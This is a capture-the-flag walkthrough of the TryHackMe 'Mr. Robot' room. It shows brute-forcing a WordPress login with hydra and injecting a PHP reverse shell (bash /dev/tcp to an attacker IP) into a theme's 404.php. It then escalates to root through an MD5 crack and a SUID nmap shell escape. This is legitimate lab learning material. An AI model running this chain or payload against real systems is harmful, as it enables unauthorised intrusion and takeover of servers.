
# 🖥️ TryHackMe: Mr. Robot CTF – Walkthrough  
**Difficulty:** Medium  
**Category:** Capture the Flag (CTF)  
**Platform:** TryHackMe  
**Objective:** Capture all 3 keys by exploiting a vulnerable WordPress site modeled after the Mr. Robot TV show.

---

## 🧩 Challenge Overview

This CTF simulates a real-world scenario where an attacker must:

1. Enumerate a target web application for vulnerabilities
2. Gain access to the WordPress backend through brute force
3. Upload or inject a malicious reverse shell
4. Escalate privileges to access protected files and ultimately gain root access

---

## 🗝️ Flag Summary

| Key        | Status | Flag (Redacted)            |
|------------|--------|----------------------------|
| Key 1 of 3 | ✅     | `REDACTED-FLAG-1`           |
| Key 2 of 3 | ✅     | `REDACTED-FLAG-2`           |
| Key 3 of 3 | ✅     | `REDACTED-FLAG-3`           |

---

## 🔍 Reconnaissance

### 🔎 Port Scanning (Nmap)

```bash
nmap -sC -sV -p- -oN scans/nmap.txt robot.thm
````

| Port | Service | Description       |
| ---- | ------- | ----------------- |
| 22   | SSH     | Closed            |
| 80   | HTTP    | Apache web server |
| 443  | HTTPS   | Apache over SSL   |

---

### 📂 Directory Bruteforcing (Gobuster)

```bash
gobuster dir -u http://robot.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o scans/gobuster.txt
```

Discovered endpoints:

* `/robots.txt` – Includes two valuable file paths:

  * `/fsocity.dic` – Wordlist for brute forcing
  * `/key-1-of-3.txt` – First flag
* `/wp-login.php` – WordPress login portal
* `/wp-content/`, `/wp-admin/` – Confirm WordPress is used

---

## 🔐 Gaining Access

### 🧹 Wordlist Deduplication

The dictionary contained many duplicates. Clean it up:

```bash
sort -u fsocity.dic > fsocity-uniq.txt
```

---

### 🔓 Brute Force WordPress Login (Hydra)

Guessed the user `elliot` based on show context. Used `hydra` to brute-force login:

```bash
hydra -l elliot -P fsocity-uniq.txt robot.thm http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered" \
-o scans/hydra-login.txt
```

**Result:** Valid credentials discovered (REDACTED)

---

## 🧪 Exploitation

### 🧭 WordPress Dashboard

After logging in, the dashboard allowed editing of theme files:

> *Appearance → Editor → 404.php*

This provides a vector to inject a PHP reverse shell payload.

---

### 🐚 Reverse Shell Payload Injection

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'");
?>
```

Steps:

1. Inserted payload into `404.php`
2. Started a netcat listener:

   ```bash
   nc -lvnp 4444
   ```
3. Triggered the shell by visiting a non-existent page:

   ```
   http://robot.thm/nonexistentpage
   ```

✅ Shell received as user: `daemon`

---

## 🧗 Privilege Escalation

### 📦 Discovering User Secrets

Navigated to:

```bash
cd /home/robot
```

Found:

* `key-2-of-3.txt` – Not accessible by `daemon`
* `password.raw-md5` – Contains an MD5 hash

### 🔐 Hash Cracking

Cracked the MD5 hash offline (tool used: `hashcat`, `crackstation.net`, or `john`).

Used cracked password to escalate via:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Password: REDACTED
```

✅ Now user: `robot`

Read second key:

```bash
cat key-2-of-3.txt
```

---

### ⚙️ Root Privilege Escalation via Nmap

SUID binary found:

```bash
find / -perm -4000 2>/dev/null | grep nmap
```

Output:

```
/usr/local/bin/nmap
```

This version allowed interactive mode:

```bash
nmap --interactive
```

Escalated via shell escape:

```bash
nmap> !sh
```

✅ Now root!

```bash
cd /root
cat key-3-of-3.txt
```

---

## 🧠 Key Learnings

* **WordPress Enumeration:** `/robots.txt` and directory fuzzing were key
* **Credential Discovery:** Public wordlist paired with a known username led to a successful brute-force
* **Theme Injection:** Editing `404.php` enabled reliable reverse shell execution
* **Privilege Escalation:** Old versions of `nmap` with SUID can be weaponized via `--interactive`
* **OpSec Reflection:** This CTF mirrors real-world misconfigurations in outdated CMS installs

---


---

## 📚 References

* [TryHackMe - Mr. Robot](https://tryhackme.com/room/mrrobot)
* [GTFOBins - nmap](https://gtfobins.github.io/gtfobins/nmap/)
* [CrackStation - Password Hash Cracker](https://crackstation.net)


## AI usage
Notes chatGPT 4o used for editing notes and parsing source code. The rest of the work is my own.
